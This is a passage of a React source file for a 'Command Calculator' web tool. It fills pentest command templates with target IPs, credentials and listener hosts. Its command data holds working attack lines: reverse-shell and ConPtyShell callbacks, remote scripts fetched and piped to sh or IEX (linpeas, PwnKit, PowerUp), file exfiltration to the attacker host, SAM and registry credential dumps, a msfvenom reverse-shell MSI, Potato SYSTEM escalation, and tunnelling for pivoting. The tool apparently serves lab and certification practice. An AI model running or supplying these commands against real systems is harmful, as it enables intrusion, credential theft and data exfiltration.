          { label: "1  Spawn a PTY", cmd: `python3 -c 'import pty; pty.spawn("/bin/bash")'`, note: "No python3? try: python -c '...' / script -qc /bin/bash /dev/null / perl -e 'exec \"/bin/bash\";'" },
          { label: "2  Background the shell", cmd: `# press:  Ctrl-Z`, note: "Drops you back to your local Kali prompt with the shell suspended." },
          { label: "3  Fix your local terminal", cmd: `stty raw -echo; fg`, note: "Type it blind — echo is off. Then press Enter once or twice; the remote prompt returns." },
          { label: "4  Set term + reset the shell", cmd: `export TERM=xterm; export SHELL=/bin/bash; reset`, note: "Now Ctrl-C, tab-complete, vim, and less all work." },
          { label: "5  Match your window size", cmd: `# on Kali, read your size:  stty size   -> ROWS COLS\nstty rows <ROWS> cols <COLS>`, note: "Fixes wrapping in top/less/nano. Run on the target with your real values." },
        ]},
        { phase: "Upgrade / stabilise (Windows)", cmds: [
          { label: "Prefer WinRM over a raw shell", cmd: `evil-winrm -i ${IP} -u ${U} -p ${Q}${SEC}${Q}`, note: "If you have creds, a real evil-winrm session beats stabilising a nc catch." },
          { label: "ConPtyShell (proper Windows TTY)", cmd: `# Kali:  stty raw -echo; (stty size; cat) | nc -lvnp ${LPORT}\n# Target: IEX(IWR http://${LHOST}:${SRVPORT}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ${LHOST} ${LPORT}`, note: "Gives a fully interactive Windows shell with tab-complete and arrow keys." },
        ]},
      ],
    },
    transfer: {
      name: "File Transfer", groups: [
        { phase: "Serve (on Kali)", cmds: [
          { label: "HTTP server", cmd: `python3 -m http.server ${SRVPORT}`, note: "Serves the current dir. SRV PORT + FILE NAME fields drive every pull below." },
          { label: "HTTPS server (when http is filtered)", cmd: `openssl req -new -x509 -keyout /tmp/s.pem -out /tmp/s.pem -days 1 -nodes -subj "/CN=x"\npython3 -c "import http.server,ssl,socketserver;h=http.server.SimpleHTTPRequestHandler;s=socketserver.TCPServer(('0.0.0.0',${SRVPORT}),h);s.socket=ssl.wrap_socket(s.socket,certfile='/tmp/s.pem',server_side=True);s.serve_forever()"` },
          { label: "SMB server (impacket)", cmd: `impacket-smbserver share $(pwd) -smb2support -user kali -password kali`, note: "Windows can pull over SMB when HTTP is blocked: copy \\\\${LHOST}\\share\\${FN} ${FN}" },
          { label: "Update Kali's copy name to match", cmd: `cp <your-file> ${FN}`, note: "Make the file you're serving match the FILE NAME field so the pull commands line up." },
        ]},
        { phase: "Pull — Windows (on target)", cmds: [
          { label: "certutil", cmd: `certutil -urlcache -f http://${LHOST}:${SRVPORT}/${FN} ${FN}` },
          { label: "PowerShell iwr", cmd: `iwr -Uri http://${LHOST}:${SRVPORT}/${FN} -OutFile ${FN}` },
          { label: "PowerShell webclient (older hosts)", cmd: `powershell -c "(New-Object Net.WebClient).DownloadFile('http://${LHOST}:${SRVPORT}/${FN}','${FN}')"` },
          { label: "SMB copy", cmd: `copy \\\\${LHOST}\\share\\${FN} ${FN}`, note: "Pairs with the impacket smbserver above." },
          { label: "Write to a world-writable dir", cmd: `iwr -Uri http://${LHOST}:${SRVPORT}/${FN} -OutFile C:\\Windows\\Temp\\${FN}`, note: "C:\\Windows\\Temp and C:\\Users\\Public are writable when your cwd isn't." },
        ]},
        { phase: "Pull — Linux (on target)", cmds: [
          { label: "wget", cmd: `wget http://${LHOST}:${SRVPORT}/${FN} -O /tmp/${FN}` },
          { label: "curl", cmd: `curl http://${LHOST}:${SRVPORT}/${FN} -o /tmp/${FN}` },
          { label: "wget + make executable (scripts/bins)", cmd: `wget http://${LHOST}:${SRVPORT}/${FN} -O /tmp/${FN} && chmod +x /tmp/${FN}` },
          { label: "no wget/curl? /dev/tcp", cmd: `exec 3<>/dev/tcp/${LHOST}/${SRVPORT}; echo -e "GET /${FN} HTTP/1.0\\r\\n\\r\\n" >&3; cat <&3 | tail -n +$(($(cat <&3 | grep -an '^\\r$' | head -1 | cut -d: -f1)+1)) > /tmp/${FN}`, note: "Bash-only fallback when no download binary exists." },
        ]},
        { phase: "Exfil — target → Kali (reverse)", cmds: [
          { label: "Kali — receiver up first", cmd: `# HTTP upload receiver:\npip install uploadserver 2>/dev/null; python3 -m uploadserver ${SRVPORT}`, note: "Or just: nc -lvnp ${SRVPORT} > ${FN}  (then send raw from target)." },
          { label: "Windows — POST a file up", cmd: `curl.exe -F "files=@${FN}" http://${LHOST}:${SRVPORT}/upload` },
          { label: "Linux — POST a file up", cmd: `curl -F "files=@/tmp/${FN}" http://${LHOST}:${SRVPORT}/upload` },
          { label: "nc file transfer (either OS)", cmd: `# Kali:  nc -lvnp ${SRVPORT} > ${FN}\n# Target: nc ${LHOST} ${SRVPORT} < ${FN}`, note: "Add -q0 on the sending side if it hangs after transfer." },
        ]},
        { phase: "VERIFY the transfer", cmds: [
          { label: "Sizes match? (Kali side)", cmd: `ls -l ${FN}`, note: "Compare against the target-side size. A truncated pull is the silent failure here." },
          { label: "Hash match (defeats corruption)", cmd: `md5sum ${FN}          # Kali\n# target Linux: md5sum /tmp/${FN}\n# target Win:   Get-FileHash ${FN} -Algorithm MD5`, note: "Equal hashes = clean transfer. Unequal = re-pull, don't run a corrupt binary." },
        ]},
      ],
    },
    winpriv: {
      name: "Win Privesc", groups: [
        { phase: "Triage", cmds: [
          { label: "Token privileges", cmd: `whoami /priv`, note: "SeImpersonate/SeAssignPrimaryToken → Potato to SYSTEM. SeBackup/SeRestore → dump SAM." },
          { label: "Groups + context", cmd: `whoami /all\nnet user %username%` },
          { label: "winPEAS", cmd: `.\\winPEASx64.exe` },
          { label: "PowerUp checks", cmd: `powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://${LHOST}:${SRVPORT}/PowerUp.ps1'); Invoke-AllChecks"` },
          { label: "Quick wins (services/unquoted)", cmd: `accesschk.exe -uwcqv "Users" *\nwmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows"`, note: "Unquoted path with a space + writable parent dir = binary-planting hijack." },
        ]},
        { phase: "SeImpersonate → SYSTEM (potatoes)", cmds: [
          { label: "PrintSpoofer", cmd: `.\\PrintSpoofer64.exe -i -c cmd`, note: "First choice on 2016/2019 with SeImpersonate." },
          { label: "GodPotato (.NET 3.5+/4)", cmd: `.\\GodPotato-NET4.exe -cmd "cmd /c whoami"`, note: "Most reliable on modern Server. Swap -NET2 if 4 fails." },
          { label: "GodPotato → reverse shell", cmd: `.\\GodPotato-NET4.exe -cmd "cmd /c C:\\Windows\\Temp\\rev.exe"` },
          { label: "JuicyPotatoNG", cmd: `.\\JuicyPotatoNG.exe -t * -p "C:\\Windows\\Temp\\rev.exe"` },
          { label: "RoguePotato (older)", cmd: `.\\RoguePotato.exe -r ${LHOST} -e "C:\\Windows\\Temp\\rev.exe" -l 9999` },
        ]},
        { phase: "Credential / hash theft", cmds: [
          { label: "SeBackup — dump SAM+SYSTEM", cmd: `reg save HKLM\\SAM sam.hive\nreg save HKLM\\SYSTEM system.hive`, note: "Then offline: impacket-secretsdump -sam sam.hive -system system.hive LOCAL" },
          { label: "Saved creds (cmdkey)", cmd: `cmdkey /list`, note: "If creds stored: runas /savecred /user:DOMAIN\\admin cmd" },
          { label: "Registry autologon", cmd: `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword` },
          { label: "Search files for passwords", cmd: `findstr /si password *.txt *.ini *.config *.xml 2>nul` },
        ]},
        { phase: "AlwaysInstallElevated", cmds: [
          { label: "Check both keys", cmd: `reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated`, note: "Both = 0x1 → any .msi runs as SYSTEM." },
          { label: "Build + run malicious MSI", cmd: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f msi -o evil.msi\nmsiexec /quiet /qn /i C:\\Windows\\Temp\\evil.msi` },
        ]},
      ],
    },
    linpriv: {
      name: "Linux Privesc", groups: [
        { phase: "Triage", cmds: [
          { label: "sudo rights", cmd: `sudo -l`, note: "Anything here → check GTFOBins for the binary." },
          { label: "SUID binaries", cmd: `find / -perm -4000 -type f 2>/dev/null`, note: "Cross-ref each against GTFOBins 'SUID' section." },
          { label: "Capabilities", cmd: `getcap -r / 2>/dev/null`, note: "cap_setuid on python/perl = instant root." },
          { label: "linpeas", cmd: `curl http://${LHOST}:${SRVPORT}/linpeas.sh | sh`, note: "Or wget to /tmp, chmod +x, run with 'sh'." },
          { label: "Writable cron / pspy", cmd: `cat /etc/crontab\nls -la /etc/cron.*\n./pspy64`, note: "pspy shows root cron jobs with no log access needed." },
        ]},
        { phase: "GTFOBins escalation", cmds: [
          { label: "sudo with NOPASSWD binary", cmd: `sudo BINARY`, note: "Look BINARY up on GTFOBins → copy the 'Sudo' payload (e.g. find: sudo find . -exec /bin/sh \\; -quit)." },
          { label: "SUID shell drop", cmd: `BINARY -p`, note: "For SUID bash/dash use -p to preserve euid." },
          { label: "Writable /etc/passwd", cmd: `openssl passwd -1 -salt x pass123\n# add: root2:<hash>:0:0:root:/root:/bin/bash  → su root2` },
        ]},
        { phase: "Kernel / known exploits", cmds: [
          { label: "Kernel + distro", cmd: `uname -a\ncat /etc/os-release` },
          { label: "Pkexec (CVE-2021-4034)", cmd: `curl http://${LHOST}/pwnkit -o /tmp/pk && chmod +x /tmp/pk && /tmp/pk`, note: "PwnKit — works on most unpatched 2021-era boxes." },
          { label: "Sudo Baron Samedit (CVE-2021-3156)", cmd: `sudoedit -s '\\' $(python3 -c 'print("A"*1000)')`, note: "Vuln if it segfaults. Use a compiled exploit to actually escalate." },
        ]},
        { phase: "Loot & creds", cmds: [
          { label: "SSH keys / history", cmd: `find / -name id_rsa 2>/dev/null\ncat ~/.bash_history` },
          { label: "Password hunt", cmd: `grep -riE 'password|passwd|secret' /etc /var/www /home 2>/dev/null | head` },
          { label: "Mounted / interesting", cmd: `cat /etc/fstab\nmount` },
        ]},
        { phase: "Group & misconfig escalations", cmds: [
          { label: "In docker / lxd group?", cmd: `id\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh`, note: "docker group = instant root via host mount. lxd: import alpine, mount / with security.privileged." },
          { label: "Readable /etc/shadow", cmd: `ls -l /etc/shadow\ncat /etc/shadow 2>/dev/null`, note: "If readable: unshadow + john, or crack root's hash (-m 1800 sha512crypt)." },
          { label: "NFS no_root_squash", cmd: `cat /etc/exports\nshowmount -e ${IP}`, note: "no_root_squash → mount the share from Kali as root, drop a SUID binary." },
          { label: "sudo LD_PRELOAD / LD_LIBRARY_PATH", cmd: `sudo -l`, note: "If env_keep+=LD_PRELOAD: compile a .so with an init() that sets uid 0, run sudo BINARY with LD_PRELOAD=./x.so." },
          { label: "linux-exploit-suggester", cmd: `curl http://${LHOST}/les.sh | bash`, note: "Maps kernel + pkgs to known local-root CVEs. Cross-check before firing kernel exploits." },
        ]},
      ],
    },
    tunnel: {
      name: "Tunneling / Pivot", groups: [
        { phase: "0 — Before you tunnel", cmds: [
          { label: "0.1  Confirm the second subnet exists", cmd: `# On the foothold, find networks Kali can't reach directly:\nip route          # linux target\nroute print       # windows target\nipconfig /all     # windows target`, note: "Reading, not running blind. You tunnel toward a subnet you've confirmed the pivot host can see." },
          { label: "0.2  Match the agent to the target arch/OS", cmd: `file agent    # verify ELF vs PE before you transfer it`, note: "Wrong-arch agent silently fails to connect. Most common ligolo dead end." },
          { label: "0.3  Serve the agent to the target", cmd: `python3 -m http.server 8000   # on Kali, then pull it from the target`, note: "Get the agent onto the pivot host first — you can't connect back without it there." },
        ]},
        { phase: "1 — ligolo-ng (preferred)", cmds: [
          { label: "1.1  Kali — interface + listener", cmd: `sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert`, note: "Run once. The ligolo console is where the agent session appears." },
          { label: "1.2  Agent (on the target)", cmd: `.\\agent.exe -connect ${LHOST}:11601 -ignore-cert`, note: "Linux target: ./agent -connect … . Watch the Kali console for 'Agent joined'." },
          { label: "1.3  Start the session + add the route", cmd: `# in the ligolo console:\nsession\n# pick the agent, then:\nstart\n# back on Kali:\nsudo ip route add 10.10.20.0/24 dev ligolo`, note: "The route uses the SECOND subnet, not the pivot's own IP." },
        ]},
        { phase: "2 — VERIFY the tunnel is live", cmds: [
          { label: "2.1  Route is installed", cmd: `ip route | grep ligolo`, note: "No line here = the ip route add didn't take. Nothing downstream will work." },
          { label: "2.2  Reach a host that only exists past the pivot", cmd: `ping -c1 10.10.20.10`, note: "This is the moment you learn it works. Do it before wasting time on a scan that 'hangs'." },
          { label: "2.3  Port-touch through the tunnel", cmd: `nmap -Pn -p 445,3389,5985 10.10.20.10`, note: "If ping is filtered, a port hit still proves the route. 'Host seems down' after this = genuinely down, not a tunnel bug." },
        ]},
        { phase: "3 — chisel (SOCKS fallback)", cmds: [
          { label: "3.1  Kali — server", cmd: `./chisel server -p 8000 --reverse` },
          { label: "3.2  Target — reverse SOCKS", cmd: `.\\chisel.exe client ${LHOST}:8000 R:socks`, note: "Then add 'socks5 127.0.0.1 1080' to /etc/proxychains4.conf." },
          { label: "3.3  VERIFY — proxychains sees the host", cmd: `proxychains -q nxc smb 10.10.20.10 ${nxcA()}`, note: "A clean SMB banner through proxychains confirms the SOCKS path. Timeout = chisel or conf is wrong." },
        ]},
        { phase: "4 — SSH forwarding (no upload needed)", cmds: [
          { label: "4.1  Local forward (reach one internal svc)", cmd: `ssh -L 8080:10.10.20.10:80 ${U}@${IP}`, note: "Kali:8080 → internal:80 through the foothold. curl localhost:8080 to test." },
          { label: "4.2  Dynamic SOCKS", cmd: `ssh -D 1080 ${U}@${IP}`, note: "proxychains everything over 1080." },
          { label: "4.3  sshuttle (transparent, needs python on target)", cmd: `sshuttle -r ${U}@${IP} 10.10.20.0/24`, note: "No proxychains — routes the subnet like a VPN." },
        ]},
        { phase: "5 — Error decoder", cmds: [
          { label: "'Agent joined' never prints", cmd: `file agent   # arch mismatch?\n# also: is ${LHOST} the tun0 IP the target can actually reach?`, note: "Wrong arch or wrong LHOST. The agent connects OUT, so LHOST must be routable from the target." },
          { label: "RTNETLINK: File exists (ip route add)", cmd: `ip route del 10.10.20.0/24\nsudo ip route add 10.10.20.0/24 dev ligolo`, note: "Route already present, often from a previous run or colliding with your VPN. Delete then re-add." },
          { label: "Tunnel up but scans still hang", cmd: `# ICMP is often filtered internally — that's not a tunnel failure.\nnmap -Pn -sT 10.10.20.10`, note: "-Pn skips host discovery; -sT (full connect) is what works reliably over SOCKS/tun." },
          { label: "proxychains: connection refused", cmd: `tail -3 /etc/proxychains4.conf`, note: "Wrong port or 'socks4' instead of 'socks5'. ligolo needs NO proxychains — that's a chisel-only step." },
        ]},
      ],
    },
    cracking: {
      name: "Hash Cracking", groups: [
        { phase: "hashcat modes", cmds: [
          { label: "NTLM (-m 1000)", cmd: `hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt` },
          { label: "Kerberoast TGS (-m 13100)", cmd: `hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt` },
          { label: "AS-REP (-m 18200)", cmd: `hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt` },
          { label: "NetNTLMv2 (-m 5600)", cmd: `hashcat -m 5600 netntlm.txt /usr/share/wordlists/rockyou.txt` },
          { label: "NetNTLMv1 (-m 5500)", cmd: `hashcat -m 5500 netntlmv1.txt /usr/share/wordlists/rockyou.txt`, note: "v1 is downgradeable to crack offline / relay to krbtgt." },
          { label: "Domain Cached Creds 2 (-m 2100)", cmd: `hashcat -m 2100 dcc2.txt /usr/share/wordlists/rockyou.txt`, note: "$DCC2$ hashes from a domain-joined host's registry — slow, low iter count helps." },
          { label: "NTLMv2 + best64 rules", cmd: `hashcat -m 5600 netntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule`, note: "When straight rockyou misses, rules are the next move before bigger lists." },
        ]},
        { phase: "Manage & fallback", cmds: [
          { label: "Show cracked (from potfile)", cmd: `hashcat -m 13100 tgs.txt --show` },
          { label: "john fallback (auto-detect)", cmd: `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\njohn --show hashes.txt` },
          { label: "Identify an unknown hash", cmd: `nth --text 'HASH'   # name-that-hash`, note: "Tells you the hashcat -m mode to use." },
        ]},
      ],
    },
  }), [authMode, varMode, Q, f, baseDN, NB, SUBNET, hostsLine, IP, DCIP, HOST, D, U, SEC, LHOST, LPORT, TH, ldapAuth, winrmAuth]);

  // ── global filter across every service ──────────────────
  const q = filter.trim().toLowerCase();
  // tokenized AND match — every whitespace-separated term must appear
  const tokens = q ? q.split(/\s+/).filter(Boolean) : [];
  const matchAll = (text) => {
    const t = (text || "").toLowerCase();
    return tokens.every((term) => t.includes(term));
  };
  const filtered = useMemo(() => {
    if (!tokens.length) return null;
    const out = [];
    for (const [id, svc] of Object.entries(services)) {
      const cmds = [];
      for (const g of svc.groups)
        for (const c of g.cmds)
          if (matchAll(c.label) || matchAll(c.cmd))
            cmds.push({ ...c, phase: g.phase });
      if (cmds.length) out.push({ id, name: svc.name, cmds });
    }
    return out;
  }, [q, services]);

  // ── All Path: every node, with your vars substituted in ──
  // Replace The Path's placeholder conventions. Order matters: longer/more
  // specific tokens first so $dcip isn't eaten by $ip, etc. Sequential
  // .replace() calls mean each token is gone before the next runs.
  const subPath = (text) => (text || "")
    .replace(/\$dc_ip\b/gi, DCIP)
    .replace(/\$dcip\b/gi, DCIP)
    .replace(/\$target_ip\b/gi, IP)
    .replace(/\$rhost\b/gi, IP)
    .replace(/\$kali_ip\b/gi, LHOST)
    .replace(/\bKALI_IP\b/g, LHOST)
    .replace(/\bTARGET_IP\b/g, IP)
    .replace(/\$lhost\b/gi, LHOST)
    .replace(/\$lport\b/gi, LPORT)
    .replace(/\$subnet\b/gi, SUBNET)
    .replace(/\$range\b/gi, SUBNET)
    .replace(/\$domain\b/gi, D)
    .replace(/\$target\b/gi, IP)
    .replace(/\$user\b/gi, U)
    .replace(/\$pass\b/gi, SEC)
    .replace(/\$ip\b/gi, IP);

  // boil a node's cmd down to its runnable form: drop # comments, ═ banners,
  // inline annotations, and blank lines. What's left is what you actually type.
  // Backslash line-continuations are joined first so multi-line commands stay whole.
  const boil = (cmd) => {
    const joined = (cmd || "").replace(/\\\n\s*/g, " "); // merge `\`-continued lines
    return joined
      .split("\n")
      .map((l) => l.replace(/\s+$/, ""))
      .filter((l) => l.trim() && !l.trim().startsWith("#"));
  };

  const phaseMeta = (p) => ({
    color: (PHASES[p] || {}).color || "#7fb3ff",
    icon: (PHASES[p] || {}).icon || "▪",
  });
  const phaseOrder = Object.keys(PHASES);
  const orderPhases = (keys) => [
    ...phaseOrder.filter((p) => keys.includes(p)),
    ...keys.filter((p) => !phaseOrder.includes(p)),
  ];

  // boiled command blocks, one per node, grouped by phase (prose-only nodes drop out)
  const allPath = useMemo(() => {
    const groups = {};
    for (const [id, n] of Object.entries(nodes)) {
      const lines = boil(n.cmd);
      if (!lines.length) continue;
      const ph = n.phase || "OTHER";
      (groups[ph] = groups[ph] || []).push({ id, title: n.title || id, lines });
    }
    return orderPhases(Object.keys(groups)).map((p) => ({
      phase: p, ...phaseMeta(p), nodes: groups[p],
    }));
  }, [phaseOrder]);

  const allNodeCount = useMemo(
    () => allPath.reduce((n, g) => n + g.nodes.length, 0), [allPath]
  );
  const allLineCount = useMemo(
    () => allPath.reduce((n, g) => n + g.nodes.reduce((m, nd) => m + nd.lines.length, 0), 0),
    [allPath]
  );

  // when searching, drop to LINE level: grep every runnable line across all nodes,
  // dedupe identical commands, group by phase. This is the "find the one line" mode.
  const allFiltered = useMemo(() => {
    if (mode !== "all") return null;
    if (!tokens.length) return { kind: "blocks", groups: allPath };
    const seen = new Set();
    const byPhase = {};
    for (const g of allPath) {
      for (const nd of g.nodes) {
        for (const line of nd.lines) {
          if (!matchAll(line) && !matchAll(nd.title)) continue;
          const key = line.trim();
          if (seen.has(key)) continue;
          seen.add(key);
          (byPhase[g.phase] = byPhase[g.phase] || []).push({ line, src: nd.title });
        }
      }
    }
    const groups = orderPhases(Object.keys(byPhase)).map((p) => ({
      phase: p, ...phaseMeta(p), lines: byPhase[p],
    }));
    return { kind: "lines", groups };
  }, [mode, q, allPath]);

  const svc = services[active];

  return (
    <div className="cc">
      <style>{css}</style>

      <header className="cc-hdr">
        <a href="/" className="cc-back">← The Path</a>
        <h1 className="cc-title">Command Calculator</h1>
        <p className="cc-sub">Fill the bar once · every command rewrites live · click to copy</p>
      </header>

      {/* VARIABLE BAR */}
      <div className="varbar">
        {/* host profile tabs */}
        <div className="host-row">
          <span className="host-lbl">Hosts</span>
          <div className="host-tabs">
            {hosts.map((h) => (
              <div key={h.id} className={`host-tab${h.id === host.id ? " on" : ""}`}>
                <button className="host-radio" onClick={() => setActiveId(h.id)} title="Make active">
                  <span className={`dot${h.id === host.id ? " on" : ""}`} />
                </button>
                {renaming === h.id ? (
                  <input
                    className="host-rename"
                    defaultValue={h.name}
                    autoFocus
                    onBlur={(e) => { rename(h.id, e.target.value.trim()); setRenaming(null); }}
                    onKeyDown={(e) => { if (e.key === "Enter") e.target.blur(); }}
                  />
                ) : (
                  <span className="host-name" onClick={() => setActiveId(h.id)} onDoubleClick={() => setRenaming(h.id)} title="Double-click to rename">
                    {h.name}
                  </span>
                )}
                {hosts.length > 1 && (
                  <button className="host-x" onClick={() => delHost(h.id)} title="Delete host">×</button>
                )}
              </div>
            ))}
            <button className="host-add" onClick={addHost} title="Add host">+ host</button>
          </div>
          <button className="clear-all" onClick={clearAll} title="Wipe all saved data">clear all</button>
        </div>

        <div className="var-grid">
          {FIELDS.map(({ k, label, ph }) => {
            const setq = !!f[k];
            return (
              <div key={k} className="var">
                <label>
                  <span className={`fdot${setq ? " set" : ""}`} />
                  {label}
                </label>
                <input
                  value={f[k]}
                  onChange={set(k)}
                  placeholder={ph}
                  type="text"
                  spellCheck={false}
                  autoComplete="off"
                />
              </div>
            );
          })}
        </div>

        <div className="auth-row">
          <span className="auth-lbl">Auth</span>
          <div className="auth-toggle">
            {AUTH.map((a) => (
              <button key={a.id} className={`auth-btn${authMode === a.id ? " on" : ""}`} onClick={() => setAuthMode(a.id)}>
                {a.label}
              </button>
            ))}
          </div>
          <span className="auth-lbl">Output</span>
          <div className="auth-toggle">
            <button className={`auth-btn${varMode === "literal" ? " on" : ""}`} onClick={() => setVarMode("literal")} title="Substitute real values">literal</button>
            <button className={`auth-btn${varMode === "vars" ? " on" : ""}`} onClick={() => setVarMode("vars")} title="Keep $shell variables">$ vars</button>
          </div>
          <span className={`ready${unfilled.length ? "" : " ok"}`}>
            {unfilled.length ? `${unfilled.length} unset` : "✓ ready"}
          </span>
          <div className="derived">
            <Chip label="base DN" value={baseDN} />
            <Chip label="NETBIOS" value={NB} />
            <Chip label="/etc/hosts" value={hostsLine.replace("\t", "  ")} />
          </div>
        </div>

        {V && exportBlock && (
          <div className="export-banner">
            <div className="export-lbl">Run once to seed your shell, then every command below uses the variables:</div>
            <CmdCard label="export" cmd={exportBlock} />
          </div>
        )}

        {authMode === "krb" && (
          <div className="krb-banner">
            Kerberos mode — commands now target <b>{HOST}</b>, not the IP. Make sure the host is in
            <code> /etc/hosts</code> and you've run <code>export KRB5CCNAME=ticket.ccache</code>.
          </div>
        )}
      </div>

      {/* MODE TOGGLE */}
      <div className="mode-row">
        <div className="mode-toggle">
          <button className={`mode-btn${mode === "curated" ? " on" : ""}`} onClick={() => setMode("curated")}>
            Curated
          </button>
          <button className={`mode-btn${mode === "all" ? " on" : ""}`} onClick={() => setMode("all")}>
            All Path · {allLineCount}
          </button>
        </div>
        <span className="mode-hint">
          {mode === "all"
            ? `${allNodeCount} nodes, commands only — type to grep every line`
            : "Hand-tuned commands with the auth toggle."}
        </span>
      </div>

      {/* FILTER */}
      <div className="filter-wrap">
        <input
          className="filter"
          value={filter}
          onChange={(e) => setFilter(e.target.value)}
          placeholder={mode === "all" ? "grep every Path command — space = AND (e.g. impacket hashes)" : "Filter every binary — psexec, kerberoast, snmpwalk…"}
          spellCheck={false}
        />
        {filter && <button className="filter-clear" onClick={() => setFilter("")}>clear</button>}
      </div>

      {/* CONTENT */}
      {mode === "all" ? (
        <div className="results">
          {allFiltered.groups.length === 0 ? (
            <div className="empty">No Path command matches “{filter}”.</div>
          ) : allFiltered.kind === "lines" ? (
            // line-level grep: one matching command per row, deduped, with source tag
            allFiltered.groups.map((g) => (
              <section key={g.phase} className="svc-block">
                <h2 className="svc-name" style={{ color: g.color }}>
                  <span style={{ marginRight: ".4rem" }}>{g.icon}</span>{g.phase}
                  <span className="phase-count">{g.lines.length}</span>
                </h2>
                <div className="cmd-list">
                  {g.lines.map((ln, i) => (
                    <CmdLine key={i} cmd={subPath(ln.line)} src={ln.src} />
                  ))}
                </div>
              </section>
            ))
          ) : (
            // browse: boiled command block per node, grouped by phase
            allFiltered.groups.map((g) => (
              <section key={g.phase} className="svc-block">
                <h2 className="svc-name" style={{ color: g.color }}>
                  <span style={{ marginRight: ".4rem" }}>{g.icon}</span>{g.phase}
                  <span className="phase-count">{g.nodes.length}</span>
                </h2>
                <div className="cmd-list">
                  {g.nodes.map((n) => (
                    <CmdCard key={n.id} label={n.title} cmd={subPath(n.lines.join("\n"))} />
                  ))}
                </div>
              </section>
            ))
          )}
        </div>
      ) : filtered ? (
        <div className="results">
          {filtered.length === 0 ? (
            <div className="empty">No command matches “{filter}”. Try a binary name or flag.</div>
          ) : (
            filtered.map((s) => (
              <section key={s.id} className="svc-block">
                <h2 className="svc-name">{s.name}</h2>
                <div className="cmd-list">
                  {s.cmds.map((c, i) => <CmdCard key={i} {...c} />)}
                </div>
              </section>
            ))
          )}
        </div>
      ) : (
        <>
          <nav className="tabs">
            {Object.entries(services).map(([id, s]) => (
              <button
                key={id}
                className={`tab${active === id ? " on" : ""}`}
                onClick={() => setActive(id)}
              >
                {s.name}
              </button>
            ))}
          </nav>
          <div className="results">
            {svc.groups.map((g, gi) => (
              <section key={gi} className="svc-block">
                <h2 className="svc-name">{g.phase}</h2>
                <div className="cmd-list">
                  {g.cmds.map((c, i) => <CmdCard key={i} {...c} />)}
                </div>
              </section>
            ))}
          </div>
        </>
      )}
    </div>
  );
}

const css = `
  @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;700&family=JetBrains+Mono:wght@400;500;700&display=swap');
  .cc *{box-sizing:border-box;margin:0;padding:0}
  .cc{
    --bg:#0b0f14; --panel:#11161d; --panel2:#0d1219; --line:#1d2630;
    --ink:#c4d0dc; --dim:#5f7184; --amber:#f5a623; --amber-soft:#f5a62322;
    --accent:#7fb3ff; --ok:#6ee7a8;
    min-height:100vh; background:var(--bg); color:var(--ink);
    font-family:'JetBrains Mono',ui-monospace,monospace; padding:1.5rem 1rem 4rem;
  }
  .cc-hdr{max-width:1080px;margin:0 auto 1.1rem}
  .cc-back{color:var(--dim);font-size:.72rem;text-decoration:none}
  .cc-back:hover{color:var(--amber)}
  .cc-title{font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:1.7rem;letter-spacing:-.01em;margin-top:.35rem;color:#eaf1f8}
  .cc-sub{font-size:.7rem;color:var(--dim);margin-top:.15rem;letter-spacing:.02em}

  .mode-row{max-width:1080px;margin:0 auto .8rem;display:flex;align-items:center;gap:.7rem;flex-wrap:wrap}
  .mode-toggle{display:inline-flex;background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:2px}
  .mode-btn{background:none;border:none;color:var(--dim);font-family:inherit;font-size:.7rem;padding:.4rem .9rem;border-radius:6px;cursor:pointer;transition:all .12s}
  .mode-btn:hover{color:var(--ink)}
  .mode-btn.on{background:var(--accent);color:#06101e;font-weight:700}
  .mode-hint{font-size:.62rem;color:var(--dim)}
  .phase-count{margin-left:.5rem;font-size:.6rem;color:var(--dim);font-weight:400;letter-spacing:0}
  .node{display:flex;flex-direction:column;gap:.3rem;padding:.2rem 0}
  .node-title{font-size:.72rem;color:#cdd9e6;font-weight:500}
  .node-body{font-size:.64rem;color:var(--dim);line-height:1.5}

  .cmdline{display:flex;align-items:center;gap:.6rem;background:var(--panel2);border:1px solid var(--line);
    border-radius:6px;padding:.4rem .6rem;cursor:pointer;transition:border-color .12s}
  .cmdline:hover{border-color:#2b3a49}
  .cmdline:active{transform:translateY(1px)}
  .cmdline-text{flex:1;font-size:.7rem;line-height:1.5;color:#aac4e0;white-space:pre-wrap;word-break:break-all;margin:0}
  .cmdline-text .tok{color:var(--amber);background:var(--amber-soft);border-radius:3px;padding:0 .15rem;font-weight:500}
  .cmdline-src{flex-shrink:0;font-size:.54rem;color:var(--dim);max-width:32%;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;text-align:right}

  .varbar{position:sticky;top:0;z-index:20;max-width:1080px;margin:0 auto 1rem;
    background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:.9rem;
    box-shadow:0 8px 30px -12px #000a}

  .host-row{display:flex;align-items:center;gap:.6rem;flex-wrap:wrap;margin-bottom:.85rem;
    padding-bottom:.8rem;border-bottom:1px solid var(--line)}
  .host-lbl{font-size:.56rem;text-transform:uppercase;letter-spacing:.12em;color:var(--dim)}
  .host-tabs{display:flex;gap:.4rem;flex-wrap:wrap;flex:1}
  .host-tab{display:flex;align-items:center;gap:.35rem;background:var(--panel2);border:1px solid var(--line);
    border-radius:7px;padding:.25rem .45rem;transition:border-color .12s}
  .host-tab.on{border-color:var(--accent)}
  .host-radio{background:none;border:none;padding:0;cursor:pointer;display:flex;align-items:center}
